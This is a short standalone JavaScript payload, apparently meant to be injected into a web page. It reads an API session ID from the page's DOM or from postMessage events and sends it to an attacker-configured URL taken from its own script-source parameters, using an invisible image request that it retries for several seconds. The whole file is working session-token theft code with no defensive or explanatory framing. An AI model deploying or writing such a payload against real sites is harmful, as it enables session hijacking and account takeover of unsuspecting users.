(function () {
    var script = document.currentScript;
    var exfilUrl = '';
    var fromParam = '';
    if (script && script.src) {
        try {
            var u = new URL(script.src);
            exfilUrl = u.searchParams.get('exfil') || u.searchParams.get('exfilUrl') || '';
            fromParam = u.searchParams.get('from') || '';
        } catch (e) {}
    }
    function exfil(sid) {
        if (!sid || !exfilUrl) return;
        try {
            var url = exfilUrl + encodeURIComponent(sid);
            if (fromParam) url += '&from=' + encodeURIComponent(fromParam);
            new Image().src = url;
        } catch (e) {}
    }
    function readFromDom() {
        var el = document.getElementById('apiSessionId') || document.querySelector('[data-api-session-id]');
        var sid = el ? (el.value || (el.getAttribute && el.getAttribute('data-api-session-id')) || el.textContent || '').trim() : '';
        return sid || '';
    }
    var sid = readFromDom();
    if (sid) exfil(sid);
    window.addEventListener('message', function (e) {
        if (e.data && e.data.type === 'sessionId' && e.data.value) {
            exfil(String(e.data.value).trim());
        }
    });
    var pollCount = 0;
    var poll = setInterval(function () {
        pollCount++;
        if (pollCount > 10) { clearInterval(poll); return; }
        sid = readFromDom();
        if (sid) { exfil(sid); clearInterval(poll); }
    }, 500);
})();
